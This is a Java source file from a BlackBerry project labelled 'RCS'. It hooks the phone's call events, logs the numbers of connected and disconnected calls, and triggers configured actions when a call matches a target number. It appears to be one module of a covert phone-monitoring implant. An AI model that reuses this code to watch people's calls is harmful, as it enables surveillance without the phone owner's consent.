//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.util.Hashtable;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import blackberry.Messages;
import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;

/**
 * The Class CallEvent.
 */
public final class EventCall extends Event implements PhoneListener {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallEvent", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    String number = "";
    int actionOnEnter;
    int actionOnExit;

    public boolean parse(ConfEvent conf) {
        try {

            String numberField = conf.getString(Messages.getString("s.0"));
            if (conf.has(numberField)) {
                number = conf.getString(numberField); //$NON-NLS-1$
            } else {
                //#ifdef DEBUG
                debug.trace("parse, no number means any number");
                //#endif
            }

            //#ifdef DEBUG
            debug.trace("parse exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
            //#endif
        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(" Error: params FAILED");//$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

    protected void actualStart() {
        Phone.addPhoneListener(this);
    }

    public void actualLoop() {
    }

    protected void actualStop() {
        Phone.removePhoneListener(this);
        onExit();
    }

    Hashtable callingHistory = new Hashtable();

    public void callConnected(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
        //#ifdef DEBUG
        debug.trace("callConnected: " + phoneNumber); //$NON-NLS-1$
        //#endif
        if (number.length() == 0 || phoneNumber.endsWith(number)) {
            //#ifdef DEBUG
            debug.trace("callConnected triggering action: " + actionOnEnter); //$NON-NLS-1$
            //#endif
            onEnter();
        }
    }

    public void callDisconnected(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = null;

        if (phoneCall != null) {

            phoneNumber = phoneCall.getDisplayPhoneNumber();
            //outgoing = phoneCall.isOutgoing();

        } else {

            synchronized (callingHistory) {
                if (callingHistory.containsKey(new Integer(callId))) {
                    phoneNumber = (String) callingHistory.get(new Integer(
                            callId));
                    callingHistory.remove(new Integer(callId));
                }
            }

            //#ifdef DEBUG
            debug.trace("callDisconnected phoneNumber: " + phoneNumber); //$NON-NLS-1$
            //#endif
        }

        //#ifdef DEBUG
        debug.trace("callDisconnected: " + phoneNumber); //$NON-NLS-1$
        //#endif
        if (number.length() == 0 || phoneNumber.endsWith(number)) {
            //#ifdef DEBUG
            debug.trace("callDisconnected triggering action: " + actionOnExit); //$NON-NLS-1$
            //#endif
            onExit();
        }
    }

    public void callIncoming(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callInitiated(int callId) {
        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }
    }

    public void callAdded(int callId) {

    }

    public void callAnswered(int callId) {

    }

    public void callConferenceCallEstablished(int callId) {

    }

    public void callDirectConnectConnected(int callId) {

    }

    public void callDirectConnectDisconnected(int callId) {

    }

    public void callEndedByUser(int callId) {

    }

    public void callFailed(int callId, int reason) {

    }

    public void callHeld(int callId) {

    }

    public void callRemoved(int callId) {

    }

    public void callResumed(int callId) {

    }

    public void callWaiting(int callid) {

    }

    public void conferenceCallDisconnected(int callId) {

    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }
}
